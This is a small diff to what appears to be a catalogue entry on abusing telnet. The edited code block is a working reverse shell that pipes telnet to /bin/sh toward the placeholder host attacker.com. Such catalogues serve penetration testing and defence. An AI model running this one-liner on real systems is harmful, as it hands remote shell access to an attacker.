@@ -13,8 +13,7 @@ functions:
       code: |
         RHOST=attacker.com
         RPORT=12345
-        TF=$(mktemp)
-        rm $TF
+        TF=$(mktemp -u)
         mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
   sudo-enabled:
     - description: BSD version only. Needs to be connected first.
